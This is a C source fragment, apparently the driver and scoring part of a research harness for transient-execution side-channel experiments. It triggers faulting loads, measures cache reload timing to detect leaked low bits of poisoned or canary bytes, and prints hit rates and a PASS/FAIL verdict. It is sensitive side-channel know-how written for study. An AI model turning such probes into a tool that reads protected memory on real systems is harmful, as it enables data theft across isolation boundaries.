        for (p = 0; p < 2; p++) {
            unsigned long faults0 = fault_count;
            int hit_n = 0;

            probe_fn = fns[p];
            for (i = 0; i < rounds; i++) {
                struct round_result r = scan_round(0, PROBE_CLASS);
                int hit = r.true_t < HOT_CYCLES;

                if (hit)
                    hit_n++;
                printf("probe=%s round=%d best=%d best_t=%llu second_t=%llu "
                       "class=%d t=%llu hot=%d %s\n",
                       names[p], i, r.best,
                       (unsigned long long)r.best_t,
                       (unsigned long long)r.second_t,
                       PROBE_CLASS, (unsigned long long)r.true_t,
                       r.hot, hit ? "HIT" : "miss");
            }
            printf("probe=%s faults=%lu expected=%d class_%02x_hot=%d/%d\n",
                   names[p], fault_count - faults0, rounds * LO_CLASSES,
                   PROBE_CLASS, hit_n, rounds);
        }
        probe_fn = NULL;
        printf("probe_result: open question only, no store-buffer claim\n");
        return 0;
    }

    if (getenv("CSEQ") != NULL) {
        int rnd, hits, maj_n = 0;
        unsigned long faults0;

        if (slot_only < 0) {
            fprintf(stderr, "CSEQ needs SLOT\n");
            return 2;
        }
        printf("cseq slot=%d trials=%d rounds=%d store=%d fresh=%d "
               "block=%d asmstore=%d rip=%d sjfirst=%d fence=%d lfence=%d "
               "loadal=%d asmchain=%d poison=%d noppre=%d pf=%d po=%d "
               "vf=%d prologue=%d vaddr=%d\n",
               slot_only, trials, rounds, cseq_store, use_fresh,
               cseq_block, cseq_asmstore, cseq_rip, cseq_sjfirst,
               cseq_fence, cseq_lfence, cseq_loadal, cseq_asmchain,
               cseq_poison, cseq_noppre, cseq_poison_full,
               cseq_poison_other, cseq_vf, cseq_prologue, cseq_vaddr);
        probe_fn = trig_zero_fault ? leak_cseq_trig : leak_cseq;
        if (getenv("CSEQ_SCAN") != NULL) {
            struct round_result sr = scan_round(0, slot_only);

            printf("cseq scan(pre) best=%d best_t=%llu second_t=%llu "
                   "true_t=%llu hot=%d\n",
                   sr.best, (unsigned long long)sr.best_t,
                   (unsigned long long)sr.second_t,
                   (unsigned long long)sr.true_t, sr.hot);
        }
        for (rnd = 0; rnd < rounds; rnd++) {
            faults0 = fault_count;
            hits = measure_slot(slot_only, trials);
            if (hits * 2 > trials)
                maj_n++;
            printf("cseq slot=%d round=%d hits=%d/%d majority=%d faults=%lu\n",
                   slot_only, rnd, hits, trials, hits * 2 > trials,
                   fault_count - faults0);
        }
        printf("cseq slot=%d majority_rounds=%d/%d repeatable=%d\n",
               slot_only, maj_n, rounds, maj_n * 2 > rounds);
        probe_fn = NULL;
        printf("cseq_result: rates only, two-run rule is outside this process\n");
        return 0;
    }

    /*
     * MATRIX=1, or VALUE=1 with SLOT, reports a hit rate per execution of
     * one slot. The full-scan VALUE path below stays one trial per class.
     * This process does not apply the two-run sentence.
     */
    if (getenv("MATRIX") != NULL || (getenv("VALUE") != NULL && slot_only >= 0)) {
        int slots[3];
        int ns, s, p, rnd, hits, maj_n;
        int maj_tab[3][3] = {{0}};
        static void (*const val_fns[])(void) = {
            leak_load_value, leak_fence_value, leak_store_value
        };
        static void (*const ref_fns[])(void) = {
            leak_load_ref, leak_fence_ref, leak_store_ref
        };
        static const char *names[] = { "nostore", "fence", "store" };

        if (getenv("MATRIX") != NULL) {
            slots[0] = CLS_POISON;
            slots[1] = CLS_ZERO;
            slots[2] = CLS_CANARY;
            ns = 3;
        } else {
            slots[0] = slot_only;
            ns = 1;
        }
        printf("matrix rule: hit=reload<%d; trials=%d; majority round=hits*2>trials; "
               "repeatable=majority_rounds*2>rounds (%d). Two processes before either "
               "sentence. Class 61 is v%%64==2 (0x02,0x42,0x82,0xC2). Class 0 is not "
               "interpreted.\n",
               HOT_CYCLES, trials, rounds);
        for (s = 0; s < ns; s++) {
            for (p = 0; p < 3; p++) {
                unsigned long faults0;

                maj_n = 0;
                probe_fn = use_ref ? ref_fns[p] : val_fns[p];
                for (rnd = 0; rnd < rounds; rnd++) {
                    int majority;

                    faults0 = fault_count;
                    hits = measure_slot(slots[s], trials);
                    majority = hits * 2 > trials;
                    if (majority)
                        maj_n++;
                    printf("matrix slot=%d arm=%s round=%d hits=%d/%d majority=%d faults=%lu\n",
                           slots[s], names[p], rnd, hits, trials, majority,
                           fault_count - faults0);
                }
                printf("matrix slot=%d arm=%s majority_rounds=%d/%d repeatable=%d\n",
                       slots[s], names[p], maj_n, rounds, maj_n * 2 > rounds);
                if (s < 3 && p < 3)
                    maj_tab[s][p] = maj_n;
            }
        }
        if (ns == 3)
            printf("summary fault=%s gadget=%s vflush=%d "
                   "s63_nostore=%d/%d s63_store=%d/%d "
                   "s61_nostore=%d/%d s61_store=%d/%d\n",
                   use_nc ? "nc-gp" : "prot-none",
                   use_ref ? "ref" : "value", use_vflush,
                   maj_tab[1][0], rounds, maj_tab[1][2], rounds,
                   maj_tab[2][0], rounds, maj_tab[2][2], rounds);
        probe_fn = NULL;
        printf("matrix_result: rates only, two-run rule is outside this process\n");
        return 0;
    }

    /*
     * VALUE=1 keys the oracle index as (al ^ 0x3f) after poisoning al.
     * It does not score the old canary-class verdict. One sample per class.
     */
    if (getenv("VALUE") != NULL) {
        static void (*const fns[])(void) = {
            leak_load_value, leak_fence_value, leak_store_value
        };
        static const char *names[] = { "nostore", "fence", "store" };
        int p, n_poison, n_zero, n_canary, n_other;

        printf("value key: poison=0x2a xor=0x3f; class %d = al stayed 0x2a; "
               "class %d = low six bits 0, whole byte unobserved; "
               "class %d = low six bits 2 (0x02, 0x42, 0x82, 0xC2); "
               "class 0 is v&0x3f==0x3f and is not interpreted. "
               "One trial per class, not one event.\n",
               CLS_POISON, CLS_ZERO, CLS_CANARY);
        for (p = 0; p < 3; p++) {
            unsigned long faults0 = fault_count;

            n_poison = n_zero = n_canary = n_other = 0;
            probe_fn = fns[p];
            for (i = 0; i < rounds; i++) {
                struct round_result r = scan_round(0, CLS_ZERO);
                int c0 = last_t[0] < HOT_CYCLES;
                int c21 = last_t[CLS_POISON] < HOT_CYCLES;
                int c61 = last_t[CLS_CANARY] < HOT_CYCLES;
                int c63 = last_t[CLS_ZERO] < HOT_CYCLES;
                const char *tag = "other";

                if (r.best == CLS_POISON)
                    tag = "poison-kept", n_poison++;
                else if (r.best == CLS_ZERO)
                    tag = "low6-zero", n_zero++;
                else if (r.best == CLS_CANARY)
                    tag = "low6-canary", n_canary++;
                else
                    n_other++;
                printf("value=%s round=%d best=%d best_t=%llu hot=%d "
                       "c0=%d c21=%d c61=%d c63=%d %s\n",
                       names[p], i, r.best,
                       (unsigned long long)r.best_t, r.hot,
                       c0, c21, c61, c63, tag);
            }
            printf("value=%s faults=%lu expected=%d poison=%d zero=%d canary=%d other=%d\n",
                   names[p], fault_count - faults0, rounds * LO_CLASSES,
                   n_poison, n_zero, n_canary, n_other);
        }
        probe_fn = NULL;
        printf("value_result: low six bits only, no full-byte claim\n");
        return 0;
    }

    for (arm = 0; arm < ARM_COUNT; arm++) {
        unsigned long faults0 = fault_count;
        int unique = 0, true_hot = 0;

        for (i = 0; i < rounds; i++) {
            struct round_result r = scan_round(arm, true_class);
            int hit = r.true_t < HOT_CYCLES;

            if (hit)
                true_hot++;
            if (r.best == true_class && r.hot == 1 && hit)
                unique++;
            printf("arm=%s round=%d best=%d best_t=%llu second_t=%llu "
                   "true_t=%llu hot=%d %s\n",
                   arm_name[arm], i, r.best,
                   (unsigned long long)r.best_t,
                   (unsigned long long)r.second_t,
                   (unsigned long long)r.true_t,
                   r.hot, hit ? "HIT" : "miss");
        }
        printf("arm=%s faults=%lu expected=%d true_hot=%d/%d unique=%d/%d\n",
               arm_name[arm], fault_count - faults0, rounds * LO_CLASSES,
               true_hot, rounds, unique, rounds);
        if (arm == ARM_NOSTORE)
            nostore_true_hot = true_hot;
        else if (arm == ARM_FENCE)
            fence_true_hot = true_hot;
        else
            store_true_hot = true_hot, store_faults = fault_count - faults0;
    }

    /*
     * Every attempt must fault on the faulting triggers. The zero-fault arms
     * (assist, demand) retire their load and raise no SIGSEGV, so there the
     * expectation is exactly 0 -- the literal would make them a permanent
     * FAIL. Those arms are SLOT-only and return from the CSEQ dispatch above,
     * so this path is not how they are scored; it is corrected so the default
     * path stays honest.
     */
    if (store_faults == (trig_zero_fault
                         ? 0UL : (unsigned long)rounds * LO_CLASSES) &&
        store_true_hot * 2 > rounds &&
        fence_true_hot == 0 && nostore_true_hot == 0) {
        printf("verdict: PASS store_true_hot=%d/%d fence_true_hot=%d nostore_true_hot=%d\n",
               store_true_hot, rounds, fence_true_hot, nostore_true_hot);
        return 0;
    }
    printf("verdict: FAIL store_true_hot=%d/%d fence_true_hot=%d nostore_true_hot=%d faults=%lu\n",
           store_true_hot, rounds, fence_true_hot, nostore_true_hot, store_faults);
    return 1;
}
